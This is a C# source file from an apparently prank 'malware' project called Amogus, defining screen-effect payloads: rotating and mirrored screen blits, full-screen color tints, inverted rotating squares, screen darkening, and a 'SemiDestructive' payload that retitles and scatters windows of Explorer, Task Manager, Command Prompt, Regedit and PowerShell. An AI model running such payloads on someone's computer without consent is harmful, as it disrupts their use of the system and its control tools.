// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using TheAirBlow.Zigman;
using TheAirBlow.Zigman.Attributes;

namespace TheAirBlow.Amogus;

public class Phase5 : Payloads
{
    private int currentRotationPayload = 1;
    private int rotationIndex1 = 1;
    private int lastRotationIndex1 = 0;
    private int rotationIndex2 = 0;

    /// <summary>
    /// Rotation values (big boi)
    /// </summary>
    private List<Rectangle> rotationValues = new() {
        //------------------------\\
        new(0, 0, Width, Height),
        new(0, 5, Width, Height),
        new(0, 10, Width, Height),
        new(0, 15, Width, Height),
        new(0, 20, Width, Height),
        new(0, 25, Width, Height),
        new(0, 30, Width, Height),
        new(0, 35, Width, Height),
        new(0, 40, Width, Height),
        new(0, 45, Width, Height),
        new(0, 50, Width, Height),
        new(0, 55, Width, Height),
        new(0, 60, Width, Height),
        //-------------------------\\
        new(5, 60, Width, Height),
        new(10, 60, Width, Height),
        new(15, 60, Width, Height),
        new(20, 60, Width, Height),
        new(25, 60, Width, Height),
        new(30, 60, Width, Height),
        new(35, 60, Width, Height),
        new(40, 60, Width, Height),
        //--------------------------\\
        new(40, 55, Width, Height),
        new(40, 50, Width, Height),
        new(40, 45, Width, Height),
        new(40, 40, Width, Height),
        new(40, 35, Width, Height),
        new(40, 30, Width, Height),
        new(40, 25, Width, Height),
        new(40, 20, Width, Height),
        new(40, 15, Width, Height),
        new(40, 10, Width, Height),
        new(40, 5, Width, Height),
        //-------------------------\\
        new(40, 0, Width, Height),
        new(35, 0, Width, Height),
        new(30, 0, Width, Height),
        new(25, 0, Width, Height),
        new(20, 0, Width, Height),
        new(15, 0, Width, Height),
        new(10, 0, Width, Height),
        new(5, 0, Width, Height),
        new(0, 0, Width, Height),
    };
    
    [Payload("rotation1", SafetyLevel.Safe)]
    [UseQueue(16, 10000)]
    public void RotationOne()
    {
        if (currentRotationPayload != 1) Thread.Sleep(1000);
        if (rotationIndex1 == rotationValues.Count - 1)
            rotationIndex1 = 0;
        var lastRotation = rotationValues[lastRotationIndex1];
        var newRotation = rotationValues[rotationIndex1];
        StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);

        rotationIndex1++;
        Thread.Sleep(100);
    }
    
    [Payload("rotate2", SafetyLevel.Safe)]
    [UseQueue(17, 10000)]
    public void RotationTwo()
    {
        if (currentRotationPayload == 1) currentRotationPayload = 2;
        if (currentRotationPayload != 2) Thread.Sleep(1000);
        if (rotationIndex2 == rotationValues.Count - 1)
            rotationIndex2 = 0;
        var lastRotation = new Rectangle(0, 0, Width, Height);
        var newRotation = rotationValues[rotationIndex2];
        StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);

        StretchBlt(DisplayHandle, -newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, -lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        StretchBlt(DisplayHandle, newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        StretchBlt(DisplayHandle, -newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
            DisplayHandle, -lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
            RasterOperation.SrcCopy);
                
        rotationIndex2++;
        Thread.Sleep(100);
    }

    private bool initialized;
    private int current;
    
    [Payload("christmas", SafetyLevel.Safe)]
    [UseQueue(18, 10000)]
    public void Christmas()
    {
        if (!initialized) {
            MagInitialize();
            initialized = true;
        }
                    
        var matrix = new ColorEffect {
            transform = new float[] {
                1, 0, 0, 0, 0,
                0, 1, 0, 0, 0,
                0, 0, 1, 0, 0,
                0, 0, 0, 1, 0,
                0, 0, 0, 0, 0
            }
        };

        matrix.transform[19 + current] = 0.4f;
        MagSetFullscreenColorEffect(ref matrix);
        current++;
        if (current == 4) current = 1;
        Thread.Sleep(500);
    }
    
    [Payload("windowsFucker", SafetyLevel.SemiDestructive)]
    [UseQueue(19, 10000)]
    public void WindowsFucker()
    {
        var processes = new List<string> {
            "explorer", "notepad",
            "wordpad", "cmd", "regedit", "taskmgr", "mspaint",
            "powershell", "calc", "control", "mmc", "winver"
        };
        foreach (var hWnd in from name in processes from proc 
                     in Process.GetProcessesByName(name) select proc.MainWindowHandle) {
            EnumChildWindows(hWnd, (hwnd, _) => {
                SetWindowTextA(hwnd, "AMOGUS (VERY SUS)");
                SetWindowPos(hwnd, (IntPtr)0, Random.Next(0, 80), 
                    Random.Next(0, 80), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
                return true;
            },  (IntPtr)null);
            SetWindowTextA(hWnd, "AMOGUS (VERY SUS)");
            SetWindowPos(hWnd, (IntPtr)ZOrder.Top, Random.Next(0, Width), 
                Random.Next(0, Height), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
        }
                    
        Thread.Sleep(500);
    }
    
    private IntPtr? _destRectangle;
    private IntPtr? _bitmapRectangle;
    private PointF? _locationRectangle;
    private POINT[][]? _pointsRectangle;
    private bool _firstRectangle = true;
    private int _runTimeRectangle;

    [Payload("rectangle", SafetyLevel.Safe)]
    [UseQueue(3, 5000)]
    public void LeSolarisRectangle()
    {
        // Bitmap stuff
        _destRectangle ??= CreateCompatibleDC(DisplayHandle);
        _bitmapRectangle ??= CreateCompatibleBitmap(
            DisplayHandle, Width, Height);
        if (_firstRectangle)
        {
            SelectObject(_destRectangle.Value, _bitmapRectangle.Value);
            BitBlt(_destRectangle.Value, 0, 0, Width, Height,
                DisplayHandle, 0, 0, RasterOperation.SrcCopy);
        }

        // Location of the shape
        _locationRectangle ??= new PointF(
            Random.Next(0, Width),
            Random.Next(0, Height));
        var x = (int) _locationRectangle.Value.X;
        var y = (int) _locationRectangle.Value.Y;
        var listPoints = new List<POINT[]>();

        // Add a octagon with size m to listPoints
        void AddPoints(int m)
        {
            listPoints.Add(new[]
            {
                new POINT(x - 20 * m, y + 20 * m),
                new POINT(x + 20 * m, y + 20 * m),
                new POINT(x + 20 * m, y - 20 * m),
                new POINT(x - 20 * m, y - 20 * m),
                new POINT(x - 20 * m, y + 20 * m)
            });
        }

        // Draw _points on screen
        void Draw(bool rotate)
        {
            for (var j = 0; j < _pointsRectangle.Length; j++)
            {
                var i = _pointsRectangle[j];
                var converted = i.ToPoint();
                if (rotate)
                {
                    var matrix = new Matrix();
                    matrix.RotateAt(5, new PointF(x, y));
                    matrix.TransformPoints(converted);
                }

                var native = converted.ToNativePoint();
                _pointsRectangle[j] = native;
                var polygon = CreatePolygonRgn(native,
                    native.Length, 1);
                SelectClipRgn(_destRectangle.Value, polygon);
                InvertRgn(_destRectangle.Value, polygon);
            }
        }

        // Cache the points
        if (_pointsRectangle == null)
        {
            for (var i = 10; i > 0; i--)
                AddPoints(i);
            _pointsRectangle = listPoints.ToArray();
        }

        Draw(true);
        BitBlt(DisplayHandle, x - 550 / 2, y - 550 / 2, 550, 550,
            _destRectangle.Value, x - 550 / 2, y - 550 / 2, RasterOperation.SrcCopy);
        Draw(false);
        Thread.Sleep(200);
        _firstRectangle = false;
        _runTimeRectangle++;
        if (_runTimeRectangle == 25)
        {
            _locationRectangle = null;
            _pointsRectangle = null;
            _bitmapRectangle = null;
            _firstRectangle = true;
            _destRectangle = null;
            _runTimeRectangle = 0;
        }
    }

    [Payload("eternalDarkness", SafetyLevel.Safe)]
    [UseQueue(20, 60000)]
    public void EternalDarkness()
    {
        StretchBlt(DisplayHandle, Random.Next(-5, 5), Random.Next(-5, 5), Width, Height,
            DisplayHandle, 0, 0, Width, Height, 8658951);
        Thread.Sleep(100);
    }
}